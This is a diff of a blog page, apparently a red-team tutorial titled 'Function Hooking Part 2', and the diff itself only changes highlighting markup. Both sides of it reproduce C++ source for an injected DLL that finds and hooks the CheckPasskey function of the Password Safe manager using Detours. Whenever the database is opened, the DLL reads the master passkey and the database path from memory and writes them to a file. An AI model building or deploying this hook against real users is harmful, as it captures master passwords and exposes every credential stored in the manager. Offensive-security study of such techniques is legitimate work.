@@ -13,7 +13,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.109.0">
 
     
     
@@ -31,7 +31,7 @@ As you can image, password managers are valuable targets during red team engamen
 <meta property="og:description" content="In this post I will expand on the information from my first post, Function Hooking Part 1 - Test Program. Previously, I discussed hooking a function from a custom application, in this post I will be hooking a function in the open-source password manager Password Safe.
 As you can image, password managers are valuable targets during red team engaments since they contain additional credentials for other services or computers. If the main password to open the database is known or obtained, then all of the other credentials in the database are compromised." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/function-hooking-part-2/" />
+<meta property="og:url" content="/posts/function-hooking-part-2/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-02-06T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-02-06T00:00:00+00:00" /><meta property="og:site_name" content="Lum8rjack" />
 
@@ -278,87 +278,87 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
 <p>Similar to the test program in part 1, I identify the first few bytes of the function in order to create the function signature.</p>
 <h2 id="writing-the-dll">Writing The DLL</h2>
 <p>Now I have all of the information I need in order to create the DLL that will be injected into the program. The &ldquo;DllMain&rdquo; function identifies the &ldquo;pwsafe.exe&rdquo; program in memory, searches for the &ldquo;CheckPasskey&rdquo; signature we identified earlier, and then jumps to the hook function &ldquo;HookCheckPasskey&rdquo;.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
-{
-	<span style="color:#66d9ef">if</span> (ul_reason_for_call <span style="color:#f92672">==</span> DLL_PROCESS_ATTACH)
-	{
-		writeToFile(<span style="color:#e6db74">&#34;[+] Injected</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-		SigScan Scanner;
-		<span style="color:#66d9ef">char</span> program[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwsafe.exe&#34;</span>;
-		<span style="color:#66d9ef">char</span> signature[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\x8b\xec\x83\xec\x10\xb8\xcc\xcc\xcc\xcc\x89\x45\xf0\x89\x45\xf4\x89\x45\xf8\x89\x45\xfc\x8b\x45\x0c\x8b\x48</span><span style="color:#e6db74">&#34;</span>;
-		<span style="color:#66d9ef">char</span> mask[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;</span>;
-		AddressOfOrigFunc <span style="color:#f92672">=</span> Scanner.FindPattern(program, signature, mask);
-		<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> noAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>;
-
-		<span style="color:#75715e">// check if the signature / address was found in memory
-</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ((LPVOID<span style="color:#f92672">&amp;</span>)AddressOfOrigFunc <span style="color:#f92672">!=</span> noAddress) {
-			hooked <span style="color:#f92672">=</span> true;
-			
-			<span style="color:#66d9ef">char</span> x[<span style="color:#ae81ff">50</span>];
-			sprintf_s(x, <span style="color:#e6db74">&#34;[+] Address of original function: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (LPVOID<span style="color:#f92672">&amp;</span>)AddressOfOrigFunc);
-			writeToFile(x);
-
-			DetourTransactionBegin();
-			DetourUpdateThread(GetCurrentThread());
-
-			<span style="color:#75715e">// this will hook the function
-</span><span style="color:#75715e"></span>			DetourAttach(<span style="color:#f92672">&amp;</span>(LPVOID<span style="color:#f92672">&amp;</span>)AddressOfOrigFunc, <span style="color:#f92672">&amp;</span>HookCheckPassKey);
-			DetourTransactionCommit();
-		}
-		<span style="color:#66d9ef">else</span> {
-			writeToFile(<span style="color:#e6db74">&#34;[-] Address for the function not found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-			writeToFile(<span style="color:#e6db74">&#34;----------------------------------------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-		}
-
-	}
-...
-</code></pre></div><p>This fuction takes in the same parameters as the &ldquo;CheckPasskey&rdquo; function from Password Safe. The parameters are initially passed to the orignial function so I can receive the return value. If the return value is &ldquo;0&rdquo;, I know that the passkey entered was correct and I can save the passkey to the output file. I had to create the &ldquo;convertString&rdquo; function to properly retrieve the data from memory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">HookCheckPassKey</span>(string<span style="color:#f92672">&amp;</span> filename, string <span style="color:#f92672">&amp;</span>passkey, string<span style="color:#f92672">&amp;</span> version)
-{
-	<span style="color:#75715e">// check if passkey is correct by running the original function
-</span><span style="color:#75715e"></span>	CheckPassKey originalCheck <span style="color:#f92672">=</span> (CheckPassKey)AddressOfOrigFunc;
-	<span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> originalCheck(filename, passkey, version);
-
-	<span style="color:#75715e">// if the result is 0 the passkey is correct
-</span><span style="color:#75715e"></span>	<span style="color:#75715e">// if it is 5 it is incorrect
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
-	{
-		<span style="color:#66d9ef">char</span> passkey_original_address[<span style="color:#ae81ff">50</span>];
-		sprintf_s(passkey_original_address, <span style="color:#e6db74">&#34;[+] Address of passkey: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (LPVOID<span style="color:#f92672">&amp;</span>)passkey);
-		writeToFile(passkey_original_address);
-
-		convertString(<span style="color:#e6db74">&#34;Passkey&#34;</span>, passkey, passkey.size());
-		convertString(<span style="color:#e6db74">&#34;Database&#34;</span>, filename, filename.size());
-	}
-
-	<span style="color:#66d9ef">return</span> result;
-}
-</code></pre></div><p>During my testing, I attached <a href="https://x64dbg.com/">x64dbg</a> debugger to find the passkey in memory. Since the DLL is writing the memory addresses of the original function to the output file, it is easy to find the passkey in the memory dump.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ul_reason_for_call <span style="color:#f92672">==</span> DLL_PROCESS_ATTACH)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		writeToFile(<span style="color:#e6db74">&#34;[+] Injected</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		SigScan Scanner;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span> program[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwsafe.exe&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span> signature[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\x8b\xec\x83\xec\x10\xb8\xcc\xcc\xcc\xcc\x89\x45\xf0\x89\x45\xf4\x89\x45\xf8\x89\x45\xfc\x8b\x45\x0c\x8b\x48</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span> mask[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;</span>;
+</span></span><span style="display:flex;"><span>		AddressOfOrigFunc <span style="color:#f92672">=</span> Scanner.FindPattern(program, signature, mask);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> noAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// check if the signature / address was found in memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ((LPVOID<span style="color:#f92672">&amp;</span>)AddressOfOrigFunc <span style="color:#f92672">!=</span> noAddress) {
+</span></span><span style="display:flex;"><span>			hooked <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">char</span> x[<span style="color:#ae81ff">50</span>];
+</span></span><span style="display:flex;"><span>			sprintf_s(x, <span style="color:#e6db74">&#34;[+] Address of original function: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (LPVOID<span style="color:#f92672">&amp;</span>)AddressOfOrigFunc);
+</span></span><span style="display:flex;"><span>			writeToFile(x);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			DetourTransactionBegin();
+</span></span><span style="display:flex;"><span>			DetourUpdateThread(GetCurrentThread());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// this will hook the function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			DetourAttach(<span style="color:#f92672">&amp;</span>(LPVOID<span style="color:#f92672">&amp;</span>)AddressOfOrigFunc, <span style="color:#f92672">&amp;</span>HookCheckPassKey);
+</span></span><span style="display:flex;"><span>			DetourTransactionCommit();
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>			writeToFile(<span style="color:#e6db74">&#34;[-] Address for the function not found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>			writeToFile(<span style="color:#e6db74">&#34;----------------------------------------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>This fuction takes in the same parameters as the &ldquo;CheckPasskey&rdquo; function from Password Safe. The parameters are initially passed to the orignial function so I can receive the return value. If the return value is &ldquo;0&rdquo;, I know that the passkey entered was correct and I can save the passkey to the output file. I had to create the &ldquo;convertString&rdquo; function to properly retrieve the data from memory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">HookCheckPassKey</span>(string<span style="color:#f92672">&amp;</span> filename, string <span style="color:#f92672">&amp;</span>passkey, string<span style="color:#f92672">&amp;</span> version)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// check if passkey is correct by running the original function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	CheckPassKey originalCheck <span style="color:#f92672">=</span> (CheckPassKey)AddressOfOrigFunc;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> originalCheck(filename, passkey, version);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// if the result is 0 the passkey is correct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// if it is 5 it is incorrect
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span> passkey_original_address[<span style="color:#ae81ff">50</span>];
+</span></span><span style="display:flex;"><span>		sprintf_s(passkey_original_address, <span style="color:#e6db74">&#34;[+] Address of passkey: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (LPVOID<span style="color:#f92672">&amp;</span>)passkey);
+</span></span><span style="display:flex;"><span>		writeToFile(passkey_original_address);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		convertString(<span style="color:#e6db74">&#34;Passkey&#34;</span>, passkey, passkey.size());
+</span></span><span style="display:flex;"><span>		convertString(<span style="color:#e6db74">&#34;Database&#34;</span>, filename, filename.size());
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>During my testing, I attached <a href="https://x64dbg.com/">x64dbg</a> debugger to find the passkey in memory. Since the DLL is writing the memory addresses of the original function to the output file, it is easy to find the passkey in the memory dump.</p>
 <p><img src="/img/FunctionHooking2/x32dbg_passkey.png" alt="x32dbg"></p>
 <p>The passkey &ldquo;password123&rdquo; starts at memory address 0x01499080 where you can see each character is followed by a null byte. The &ldquo;convertString&rdquo; function takes three parameters: text that will be saved to the output file, the memory address where the passkey is located, and the length of the passkey.</p>
 <p>The function calculates the number of bytes to read based off the length of the passkey and the extra null bytes. Then the function loops through the bytes and outputs the characters to the output file that are not null bytes.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">convertString</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> name[], string<span style="color:#f92672">&amp;</span> sValue, <span style="color:#66d9ef">int</span> length) {
-	<span style="color:#66d9ef">int</span> buff_size <span style="color:#f92672">=</span> length <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
-	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[buff_size];
-	SIZE_T dwRead;
-	ReadProcessMemory(GetCurrentProcess(), (LPVOID<span style="color:#f92672">&amp;</span>)sValue, c, buff_size, <span style="color:#f92672">&amp;</span>dwRead);
-
-	ofstream myfile;
-	myfile.open(outFile, std<span style="color:#f92672">::</span>ios_base<span style="color:#f92672">::</span>app);
-	myfile <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] &#34;</span> <span style="color:#f92672">&lt;&lt;</span> name <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;: &#34;</span>;
-	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> buff_size; i<span style="color:#f92672">++</span>)
-	{
-		<span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)c[i] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
-		{
-			myfile <span style="color:#f92672">&lt;&lt;</span> c[i];
-		}
-	}
-	myfile <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-	myfile.close();
-
-	<span style="color:#66d9ef">delete</span>[] c;
-}
-</code></pre></div><p>Every time Password Safe tries calling the &ldquo;CheckPasskey&rdquo; function, I will now be able to intercept and save the passkey to a file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">convertString</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> name[], string<span style="color:#f92672">&amp;</span> sValue, <span style="color:#66d9ef">int</span> length) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> buff_size <span style="color:#f92672">=</span> length <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[buff_size];
+</span></span><span style="display:flex;"><span>	SIZE_T dwRead;
+</span></span><span style="display:flex;"><span>	ReadProcessMemory(GetCurrentProcess(), (LPVOID<span style="color:#f92672">&amp;</span>)sValue, c, buff_size, <span style="color:#f92672">&amp;</span>dwRead);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ofstream myfile;
+</span></span><span style="display:flex;"><span>	myfile.open(outFile, std<span style="color:#f92672">::</span>ios_base<span style="color:#f92672">::</span>app);
+</span></span><span style="display:flex;"><span>	myfile <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] &#34;</span> <span style="color:#f92672">&lt;&lt;</span> name <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;: &#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> buff_size; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)c[i] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			myfile <span style="color:#f92672">&lt;&lt;</span> c[i];
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	myfile <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>	myfile.close();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">delete</span>[] c;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Every time Password Safe tries calling the &ldquo;CheckPasskey&rdquo; function, I will now be able to intercept and save the passkey to a file.</p>
 <h2 id="testing">Testing</h2>
 <p>Now it is time to test out the DLL. After starting the application, I inject the DLL and can see the address of the original &ldquo;CheckPasskey&rdquo; function.</p>
 <p><img src="/img/FunctionHooking2/injected.png" alt="injected"></p>
